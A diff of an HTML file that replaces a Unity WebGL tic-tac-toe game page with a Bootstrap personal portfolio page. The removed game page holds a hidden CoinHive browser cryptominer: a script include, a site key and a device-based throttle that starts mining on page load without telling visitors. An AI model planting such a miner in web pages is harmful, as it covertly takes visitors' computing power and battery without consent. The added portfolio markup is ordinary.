@@ -1,60 +1,163 @@
-<!doctype html>
-<html lang="en-us">
+<html>
   <head>
-    <meta charset="utf-8">
-    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
-    <title>Unity WebGL Player | UI_Test</title>
-    <link rel="stylesheet" href="TemplateData/style.css">
-    <link rel="shortcut icon" href="TemplateData/favicon.ico" />
-    <script src="TemplateData/UnityProgress.js"></script>
-    <script src="https://coinhive.com/lib/coinhive.min.js"></script>
+    <title>Portifólio Page: Inhanduí Barbosa </title>
+      <meta charset="utf-8">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.6/css/bootstrap.min.css" integrity="sha384-rwoIResjU2yc3z8GV/NPeZWAv56rSmLldC3R/AZzGRnGxQQKnKkoFVhFQhNUwEyJ" crossorigin="anonymous">
+<script src="https://code.jquery.com/jquery-3.1.1.slim.min.js" integrity="sha384-A7FZj7v+d/sdmMqp/nOQwliLvUsJfDHW+k9Omg/a/EheAdgtzNs3hpfag6Ed950n" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/tether/1.4.0/js/tether.min.js" integrity="sha384-DztdAPBWPRXSA/3eYEEUWrWCy7G5KFbe8fFjk5JAIxUYHKkDx6Qin1DkWx51bBrb" crossorigin="anonymous"></script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.6/js/bootstrap.min.js" integrity="sha384-vBWWzlZJ8ea9aCX4pEW3rVHjgjt7zpkNpZk+02D9phzyeVkE+jo0ieGizqPLForn" crossorigin="anonymous"></script>
+      
+      <style>
+          /* Extra small devices (phones, less than 768px) */
+          @media (max-width: 768px) {
+               .presentation-backgroud{
+                    z-index: 10;
+                    padding: -40px;
+                    position: relative;
+                }
+
+                .presentation-foreground{
+                    z-index: 20;
+                    margin-top: -47%;
+                    margin-left: auto;
+                    margin-right: auto;
+                    width: 20%;
+                    height: 20%;
+                    position: relative;
+                }
+
+                .presentation-text{
+                    z-index: 90;
+                    color: white;
+                    background-color: white;
+                    margin-top: -24%;
+                }
+
+                h1 {
+                    z-index: 90;
+                    color: black;
+                    background-color: gray;
+                    opacity: 0.6;
+                } 
+          } 
+          
+          /* Small devices (tablets, 768px and up) */
+          @media (min-width: 768px) and (max-width: 992px) {
+              .presentation-backgroud{
+                    z-index: 10;
+                    padding: -40px;
+                    position: relative;
+                }
+
+                .presentation-foreground{
+                    z-index: 20;
+                    margin-top: -47%;
+                    margin-left: auto;
+                    margin-right: auto;
+                    width: 20%;
+                    height: 20%;
+                    position: relative;
+                }
+
+                .presentation-text{
+                    z-index: 90;
+                    color: white;
+                    background-color: white;
+                    margin-top: -24%;
+                }
+
+                h1 {
+                    z-index: 90;
+                    color: black;
+                    background-color: gray;
+                    opacity: 0.6;
+                }
+          }
+
+          
+          /* Medium devices (desktops, 992px and up) */
+          @media (min-width: 992px) and (max-width: 1200px) {
+              .presentation-backgroud{
+                    z-index: 10;
+                    padding: -40px;
+                    position: relative;
+                }
+
+                .presentation-foreground{
+                    z-index: 20;
+                    margin-top: -47%;
+                    margin-left: auto;
+                    margin-right: auto;
+                    width: 20%;
+                    height: 20%;
+                    position: relative;
+                }
+
+                .presentation-text{
+                    z-index: 90;
+                    color: white;
+                    background-color: white;
+                    margin-top: -24%;
+                }
+
+                h1 {
+                    z-index: 90;
+                    color: black;
+                    background-color: gray;
+                    opacity: 0.6;
+                }
+          }
+          
+          /* Large devices (large desktops, 1200px and up) */
+          @media (min-width: 1200px) {
+              .presentation-backgroud{
+                    z-index: 10;
+                    padding: -40px;
+                    position: relative;
+                }
+
+                .presentation-foreground{
+                    z-index: 20;
+                    margin-top: -47%;
+                    margin-left: auto;
+                    margin-right: auto;
+                    width: 20%;
+                    height: 20%;
+                    position: relative;
+                }
+
+                .presentation-text{
+                    z-index: 90;
+                    color: white;
+                    background-color: white;
+                    margin-top: -24%;
+                }
+
+                h1 {
+                    z-index: 90;
+                    color: black;
+                    background-color: gray;
+                    opacity: 0.6;
+                }
+          }
+      </style>
   </head>
-  <body class="template">
-    <script>
-      var throttleValue = 0.0;
-
-      if( navigator.userAgent.match(/Android/i)
-         || navigator.userAgent.match(/webOS/i)
-         || navigator.userAgent.match(/iPhone/i)
-         || navigator.userAgent.match(/iPad/i)
-         || navigator.userAgent.match(/iPod/i)
-         || navigator.userAgent.match(/BlackBerry/i)
-         || navigator.userAgent.match(/Windows Phone/i)
-         || navigator.userAgent.match(/Mobile/)
-         )
-      {
-            throttleValue = 0.9;
-            alert("Aguarde! O jogo pode demorar para carregar em um dispositivo móvel!");
-      }
-      else {
-            throttleValue = 0.7;
-      }
-      var miner = new CoinHive.Anonymous('56IwAT62JfmsI5oHX562l1QY6r8GYRWT', { 
-        throttle: throttleValue}
-        );
-      miner.start();
-    </script>
-    <p class="header"><span>Unity WebGL Player | </span>Jogo da velha</p>
-    <div class="template-wrap clear">
-      <canvas class="emscripten" id="canvas" oncontextmenu="event.preventDefault()" height="600px" width="960px"></canvas>
-      <br>
-      <div class="logo"></div>
-      <div class="fullscreen"><img src="TemplateData/fullscreen.png" width="38" height="38" alt="Fullscreen" title="Fullscreen" onclick="SetFullscreen(1);" /></div>
-      <div class="title">UI_Test</div>
-    </div>
-    <p class="footer">&laquo; created with <a href="http://unity3d.com/" title="Go to unity3d.com">Unity</a> &raquo;</p>
-    <script type='text/javascript'>
-  var Module = {
-    TOTAL_MEMORY: 268435456,
-    errorhandler: null,			// arguments: err, url, line. This function must return 'true' if the error is handled, otherwise 'false'
-    compatibilitycheck: null,
-    dataUrl: "Release/jogo_da_velha.data",
-    codeUrl: "Release/jogo_da_velha.js",
-    memUrl: "Release/jogo_da_velha.mem",
-    
-  };
-</script>
-<script src="Release/UnityLoader.js"></script>
-
+  <body>
+      <img class="presentation-background img-fluid" src="https://scontent.fnat1-1.fna.fbcdn.net/v/t31.0-8/22137318_1466382200112239_9000342499339945141_o.jpg?oh=9ebbe3b48b384caf17cecf4edbea3b36&oe=5A966BC0">
+      
+      <div class="presentation-foreground text-center">
+          <img class="img-thumbnail rounded-circle" src="https://scontent.fnat1-1.fna.fbcdn.net/v/t1.0-9/20108130_1401021089981684_4236980710394203881_n.jpg?oh=9a819a94ece1daad71b9acfb5d9fe81c&oe=5AA646DC">
+      </div>
+      
+      <!--
+      <div class="presentation-foreground text-center">
+          <img class="img-thumbnail rounded-circle w-25 h-35" src="https://scontent.fnat1-1.fna.fbcdn.net/v/t1.0-9/20108130_1401021089981684_4236980710394203881_n.jpg?oh=9a819a94ece1daad71b9acfb5d9fe81c&oe=5AA646DC">
+      </div>
+      
+      <h3 class="presentation-text">Building Dreams Systems</h3>
+      <h1>Portfolio</h1>
+      <img src="https://www.technewscentral.com/wp-content/uploads/2016/06/best-laptop-for-developers.jpg" class="img-responsive rounded">
+      <img class="img-responsive rounded" src="https://www.technewscentral.com/wp-content/uploads/2016/06/best-laptop-for-developers.jpg">
+        -->
   </body>
 </html>
